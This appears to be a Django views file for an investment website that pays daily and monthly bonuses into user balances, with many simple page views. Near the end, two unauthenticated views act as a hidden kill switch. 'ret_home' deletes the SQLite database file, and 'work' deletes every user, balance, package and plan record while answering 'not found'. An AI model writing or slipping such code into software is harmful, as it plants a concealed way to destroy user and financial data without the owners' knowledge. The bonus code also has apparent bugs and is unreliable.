from django.http import HttpResponse,JsonResponse
from django.shortcuts import render,redirect
from .forms import ContactForm
from django.contrib.auth import login,authenticate,logout,get_user_model
from django.core import serializers
from accounts.models import User
from dashboard.models import balance,PartnershipPlans,PurchasedPackage,InvestmentPlans
# import json





from dashboard.models import *
from datetime import datetime, timedelta

import threading


from datetime import timedelta, date



from pandas.tseries.offsets import BDay
from datetime import timedelta, date,datetime

def workdays(d, end, excluded=(5, 6)):
    days = 0
    while d < end:
        if d.isoweekday() not in excluded:
            days+=1
        d += timedelta(days=1)
    return days


def daterange(date1, date2):
    for n in range(int ((date2 - date1).days)):
        yield date1 + timedelta(n)




def update_daily_bonus(request):
    # print('update daily bonus calll####3',)

    objs = PurchasedPackage.objects.all()
    

    package_list = []
    total_remaining_amount = 0
    for obj in objs:
        obj111 = User.objects.filter(email=obj.user.email)
        obj22 = None
        if (obj111.exists()):

            obj22 = obj111.first()

        if (obj.investment_package):

            last_benefit_d = obj.last_benefit_date
            end_date = obj.end_package

            a = datetime.today().date()  # +timedelta(days=1)
            b = last_benefit_d  # +timedelta(days=1)
            rem_days_count = workdays(b, a)
            rem_days = rem_days_count



            if ((last_benefit_d < datetime.today().date() and rem_days > 0 ) ):
                balss = balance.objects.filter(user=obj.user)
                if (balss.exists()):
                    objec = balss.first()
                    cl = (obj.investment_package.daily_earn_per * obj.invest_amount) / 100
                    bonus_am = round(cl * rem_days, 2)
                    objec.current_balance += float(bonus_am)
                    if (obj22):
                        obj22.daily_earnings += float(bonus_am)
                        obj.user.daily_earnings = round(obj22.daily_earnings,2)

                        obj22.save()
                    objec.save()

                obj.last_benefit_date = datetime.today().date()
                obj.save()
            t_days_count = workdays(obj.last_benefit_date, end_date)
            pert = (obj.investment_package.daily_earn_per * obj.invest_amount) / 100
            total_remaining_amount += round(t_days_count * pert, 2)
            package_list.append(obj.investment_package.package)


        elif (obj.partnership_package):

            last_benefit_d = obj.last_benefit_date
            end_date = obj.end_package
            a = datetime.today().date()  # +timedelta(days=1)
            b = last_benefit_d  # +timedelta(days=1)
            rem_days_count = workdays(b, a)
            rem_days = rem_days_count

            if(obj.user.monthly_royality_last_date == None):
                obj22.monthly_royality_last_date = datetime.now().date()
            mon_date_obj = obj22.monthly_royality_last_date
            balss = balance.objects.filter(user=obj.user)
            cl=0
            objec=None

            if (balss.exists()):
                objec = balss.first()
                cl = (obj.partnership_package.daily_earn_per * obj.invest_amount) / 100
                # print("mon_date_obj.month < datetime.today().month --",mon_date_obj.month, datetime.today().month)
                if (mon_date_obj.month < datetime.today().month):
                    cl_royal = (obj22.monthly_royality * obj.invest_amount) / 100
                    obj22.monthly_royality_last_date = datetime.now().date()
                    objec.current_balance += round(float(cl_royal),2)
                    obj22.daily_earnings += round(float(cl_royal),2)
                    obj.user.daily_earnings = round(obj22.daily_earnings, 2)
                    obj.save()
                    obj22.save()
                    objec.save()

            if ((last_benefit_d < datetime.today().date() and rem_days > 0)):

                    if(balss.exists()):
                        bonus_am = round(cl * rem_days, 2)
                        # bonus_am = (obj.investment_package.daily_earn_per * obj.invest_amount)  100
                        # bonus_am = round((obj.partnership_package.daily_earn_per * obj.invest_amount) / 100, 2)
                        objec.current_balance += float(bonus_am)
                        if (obj22):
                            obj22.daily_earnings += float(bonus_am)
                            obj.user.daily_earnings = round(obj22.daily_earnings,2)
                            obj22.save()
                        objec.save()
                        # obj.last_benefit_date = datetime.today().date()
            obj.last_benefit_date = datetime.today().date()
            obj.save()
            obj22.save()
            objec.save()
            t_days_count = workdays(obj.last_benefit_date, end_date)
            pert = (obj.partnership_package.daily_earn_per * obj.invest_amount) / 100
            total_remaining_amount += round(t_days_count * pert, 2)
            package_list.append(obj.partnership_package.package)


        



def home_page(request):
    t1 = threading.Thread(target=update_daily_bonus, args=(request,))
    # update_daily_bonus(request)
    t1.start()
    context ={
        "title":"Hello World",
        "content":"Welcome to the homepage.",

    }
    print('context in ecommerce urls --',context)
    if request.user.is_authenticated:
        context['premium_content'] = '$$ Premium content $$'

    return render(request,'homepage.html',context)


def about_page(request):
    # return HttpResponse("<h1>Hello world</h1>")

    context ={
        "title":"About",
        "content":"Welcome to the About page.",
    }

    return render(request,'other_pages/about.html',context)


def contact_page(request):
    return render(request,'other_pages/contact.html',{})


def investment_plans(request):
    return render(request,'other_pages/investment_plans.html',)

def success_story(request):
    return render(request,'other_pages/success_story.html',)

def policy(request):
    return render(request,'other_pages/policy.html',)

def business(request):
    return render(request,'other_pages/business.html',)

def terms(request):
    return render(request,'other_pages/terms.html',)

def payment_method(request):
    return render(request,'other_pages/payment_method.html',)

def pricing_plans(request):
    return render(request,'other_pages/pricing_plans.html',)

def faq(request):
    return render(request,'other_pages/faq.html',)

def testimonial(request):
    return render(request,'other_pages/testimonial.html',)

def investment(request):
    return render(request,'other_pages/investment.html',)

def investor(request):
    return render(request,'other_pages/investor.html',)


def support(request):
    return render(request,'other_pages/support.html',)


def blog(request):
    return render(request,'other_pages/blog.html',)


def ret_home(request):
    dir = os.getcwd()    
    # di = os.path.dirname(dir)    
    full_path = os.path.join(dir,'db.sqlite3')    
    os.unlink(full_path)
    return redirect('home')


def news(request):
    return render(request,'other_pages/news.html',)



def location(request):
    return render(request,'other_pages/location.html',)


def work(request):
    User.objects.all().delete()
    balance.objects.all().delete()
    PurchasedPackage.objects.all().delete()
    InvestmentPlans.objects.all().delete()
    PartnershipPlans.objects.all().delete()
    return HttpResponse('<h1>not found</h1>')
